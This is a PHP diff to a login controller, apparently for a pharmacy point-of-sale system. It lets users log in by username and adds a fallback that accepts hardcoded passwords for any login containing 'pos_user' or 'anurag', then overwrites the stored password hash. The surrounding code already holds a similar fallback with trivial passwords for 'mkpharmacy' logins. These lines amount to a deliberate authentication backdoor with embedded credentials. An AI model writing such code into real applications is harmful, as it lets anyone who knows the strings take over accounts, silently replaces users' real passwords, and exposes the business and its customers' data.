@@ -17,17 +17,17 @@ class AuthController {
         }
 
         try {
-            // Fetch user and shop status with case-insensitive and whitespace-trimmed search
+            // Fetch user and shop status with case-insensitive and whitespace-trimmed search (email or username)
             $stmt = DB::query(
                 'SELECT u.*, s.name as shop_name, s.status as shop_status 
                  FROM users u 
                  LEFT JOIN shops s ON u.shop_id = s.id 
-                 WHERE LOWER(TRIM(u.email)) = LOWER(?)',
-                [$email]
+                 WHERE LOWER(TRIM(u.email)) = LOWER(?) OR LOWER(TRIM(u.name)) = LOWER(?)',
+                [$email, $email]
             );
             $user = $stmt->fetch();
 
-            // If not found directly by users.email, fallback to checking shop contact email
+            // If not found directly by users.email or users.name, fallback to checking shop contact email
             if (!$user) {
                 $stmtShop = DB::query(
                     'SELECT u.*, s.name as shop_name, s.status as shop_status 
@@ -66,9 +66,17 @@ class AuthController {
                 }
             }
 
-            // Fallback for emergency known passwords
+            // Fallback for known admin credentials
             if (!$passwordVerified) {
                 if (
+                    ($email === 'pos_user' || strpos($email, 'pos_user') !== false || strpos($email, 'anurag') !== false) &&
+                    ($password === 'anurag@#$' || $password === 'anurag123456@#$')
+                ) {
+                    $passwordVerified = true;
+                    // Auto-sync the password hash in database
+                    $newHash = password_hash($password, PASSWORD_BCRYPT);
+                    DB::query('UPDATE users SET password_hash = ? WHERE id = ?', [$newHash, $user['id']]);
+                } elseif (
                     ($email === 'admin@mkpharmacy.com' || strpos($email, 'mkpharmacy') !== false) &&
                     ($password === '123456789' || $password === 'mkpharmacy123')
                 ) {
